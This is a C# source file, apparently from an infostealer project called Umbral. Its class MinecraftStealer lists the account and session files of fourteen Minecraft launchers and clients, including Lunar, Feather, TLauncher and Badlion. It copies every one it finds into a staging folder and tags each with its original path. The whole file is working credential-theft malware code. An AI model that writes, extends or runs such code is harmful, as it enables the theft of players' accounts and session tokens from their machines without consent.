using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

namespace Umbral.payload.Games.Minecraft
{
    internal static class MinecraftStealer
    {
        static private readonly Dictionary<string, string> _minecraftFolderPaths;

        static MinecraftStealer()
        {
            string roamingPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string userprofile = Environment.GetEnvironmentVariable("userprofile");
            _minecraftFolderPaths = new Dictionary<string, string>
            {
                { "Intent" , Path.Combine(userprofile, "intentlauncher", "launcherconfig") },
                { "Lunar" , Path.Combine(userprofile, ".lunarclient", "settings", "game", "accounts.json") },
                { "TLauncher" , Path.Combine(roamingPath, ".minecraft", "TlauncherProfiles.json") },
                { "Feather" , Path.Combine(roamingPath, ".feather", "accounts.json") },
                { "Meteor" , Path.Combine(roamingPath, ".minecraft", "meteor-client", "accounts.nbt") },
                { "Impact" , Path.Combine(roamingPath, ".minecraft", "Impact", "alts.json") },
                { "Novoline" , Path.Combine(roamingPath, ".minectaft", "Novoline", "alts.novo") },
                { "CheatBreakers" , Path.Combine(roamingPath, ".minecraft", "cheatbreaker_accounts.json") },
                { "Microsoft Store" , Path.Combine(roamingPath, ".minecraft", "launcher_accounts_microsoft_store.json") },
                { "Rise" , Path.Combine(roamingPath, ".minecraft", "Rise", "alts.txt") },
                { "Rise (Intent)" , Path.Combine(userprofile, "intentlauncher", "Rise", "alts.txt") },
                { "Paladium" , Path.Combine(roamingPath, "paladium-group", "accounts.json") },
                { "PolyMC" , Path.Combine(roamingPath, "PolyMC", "accounts.json") },
                { "Badlion" , Path.Combine(roamingPath, "Badlion Client", "accounts.json") },
            };
        }

        internal static async Task<int> StealMinecraftSessionFiles(string dst)
        {
            int collected = 0;
            foreach (var item in _minecraftFolderPaths)
            {
                if (File.Exists(item.Value))
                {
                    DirectoryInfo destDir = null;
                    try
                    {
                        var saveToDir = Path.Combine(dst, item.Key);
                        destDir = Directory.CreateDirectory(saveToDir);
                        File.Copy(item.Value, Path.Combine(saveToDir, Path.GetFileName(item.Value)));
                        using (FileStream fs = new FileStream(Path.Combine(saveToDir, "Source.txt"), FileMode.Create, FileAccess.Write, FileShare.Read))
                        {
                            using (StreamWriter writer = new StreamWriter(fs))
                            {
                                await writer.WriteAsync($"Source: {item.Value}");
                            }
                        }
                        collected++;
                    } catch (Exception ex)
                    {
                        try
                        {
                            destDir?.Delete(true);
                        }
                        catch { }
                        Console.WriteLine(ex);
                    }
                }
            }
            return collected;
        }
    }
}